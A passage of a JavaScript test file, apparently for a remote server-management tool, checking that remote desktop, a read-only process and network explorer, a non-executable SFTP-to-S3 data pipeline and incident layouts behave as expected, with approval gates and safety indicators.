  const { manager } = fixture(); const desktop = manager.execute('remote-desktop-pro', { protocol: 'rdp', displays: [{ id: 'one', width: 1920, height: 1080 }, { id: 'two', width: 2560, height: 1440 }], audio: true, driveMapping: true, usb: true, recording: true }); assert.equal(desktop.presentation, 'multi-monitor'); assert.equal(desktop.channels.usb, 'explicit-device-approval'); assert.equal(desktop.requiresApproval, true); const explorer = manager.execute('live-process-network-explorer', { processes: [{ pid: 1, parentPid: 0, name: 'init' }, { pid: 20, parentPid: 1, name: 'app' }], sockets: [{ protocol: 'tcp', local: '0.0.0.0:443', state: 'LISTEN', pid: 20 }] }); assert.equal(explorer.visualization, 'process-tree-and-network-graph'); assert.equal(explorer.edges.some(item => item.kind === 'owns' && item.resolved), true); assert.equal(explorer.mutationsAllowed, false);
});

test('cross-host pipelines and focused layouts remain visual, resumable and task-oriented', () => {
  const { manager } = fixture(); const pipeline = manager.execute('cross-host-data-pipeline', { name: 'Migration', stages: [{ kind: 'source', endpoint: { protocol: 'sftp', sessionId: 'a', path: '/data' } }, { kind: 'scan' }, { kind: 'verify' }, { kind: 'destination', endpoint: { protocol: 's3', sessionId: 'b', path: '/bucket' } }] }); assert.equal(pipeline.visualization, 'directed-stage-canvas'); assert.equal(pipeline.pipeline.guarantees.includes('resume-checkpoint'), true); assert.equal(pipeline.pipeline.executable, false); const layout = manager.execute('focus-incident-layouts', { mode: 'incident', maximumPanels: 4 }); assert.equal(layout.layout.visiblePanels.length, 4); assert.equal(layout.layout.responsive.mobile, 'single-primary-with-drawer'); assert.ok(layout.layout.safetyAlwaysVisible.includes('server-identity'));
});
